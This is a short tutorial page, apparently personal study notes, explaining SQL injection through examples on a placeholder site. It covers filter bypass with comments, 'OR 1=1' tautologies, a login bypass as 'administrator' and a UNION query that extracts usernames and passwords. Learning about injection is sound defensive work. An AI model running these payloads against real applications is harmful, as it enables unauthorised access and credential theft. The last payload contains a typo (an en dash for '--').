---
title: "SQL Information"
permalink: /SQL-Info/
layout: single
author-profile: true
---

SQL Injection is a web security vulnerability which allows an attacker to interfere with the queries that an application makes.

SQLI can be used to: 

- Retrieve hidden data
- Subverting application logic
- UNION attacks
- Examining the database
- Bline SQL Injection

## Retrieving hidden data

If you have a URL:

``https://insecure-website.com/products?category=Gifts``

This will query the database like this:

``SELECT * FROM products WHERE category = 'Gifts' AND released = 1``

This asks the data base to return `*` all details, from the products table, where the category is gifts and released is 1.

`Released = 1` is being used to hide products which are not released

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:

``https://insecure-website.com/products?category=Gifts'--``
 
This results in the SQL query:

``SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1``

double-dash sequence `--` is a comment indicator in SQL, this will stop `AND released = 1` from being sent in the query

Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:
 
``https://insecure-website.com/products?category=Gifts'+OR+1=1--``
 
This results in the SQL query:
 
``SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1``

## Subverting Application Logic
After trying to login with a username and password, the application checks with the SQL database with the following query:

``SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'``

If the query returns the details of a user then the login is successful. An attacker can login without a password by removing the password result with this query:

``SELECT * FROM users WHERE username = 'administrator'--' AND password = ''``

## Retrieving data from other tables
An attacker can use SQLI to retrieve data from other tables. THis is done using the UNION keyword. This allows an attacker to do an additional SELECT.

For this query:

``SELECT name, description FROM products WHERE category = 'Gifts'``

An attacker would submit:

``' UNION SELECT username, password FROM users–``
